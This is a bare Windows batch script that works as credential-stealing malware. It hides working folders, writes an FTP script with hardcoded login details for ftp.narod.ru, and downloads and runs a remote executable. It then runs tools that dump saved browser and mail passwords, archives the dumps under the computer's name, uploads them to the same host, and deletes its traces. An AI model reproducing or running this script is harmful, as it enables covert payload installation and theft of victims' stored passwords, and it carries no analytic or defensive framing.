md C:\1
attrib +h +s +r C:\1
echo open ftp.narod.ru>C:\1\1.txt
echo user Dersyfgh gdfey776d55d>>C:\1\1.txt
echo bin>>C:\1\1.txt
echo get 1.exe C:\1\1.exe>>C:\1\1.txt
echo bye>>C:\1\1.txt
ftp -n -s:C:\1\1.txt
cd C:\1\
start /min /wait 1.exe
rd /s /q C:\1
attrib +h +s +r C:\ps
cd C:\ps\
md pass
start /wait ie.exe /stext pass\ie.txt
start /wait m.exe /stext pass\m.txt
start /wait o.exe /stext pass\o.txt
start /wait ch.exe /stext pass\ch.txt
start /wait /min winrar.exe a -r C:\ps\%COMPUTERNAME%.rar pass
echo open ftp.narod.ru>C:\ps\2.txt
echo user Dersyfgh gdfey776d55d>>C:\ps\2.txt
echo bin>>C:\ps\2.txt
echo put C:\ps\%COMPUTERNAME%.rar>>C:\ps\2.txt
echo bye>>C:\ps\2.txt
ftp -n -s:C:\ps\2.txt
del C:\ps\2.txt
rd /s /q C:\ps 
exit

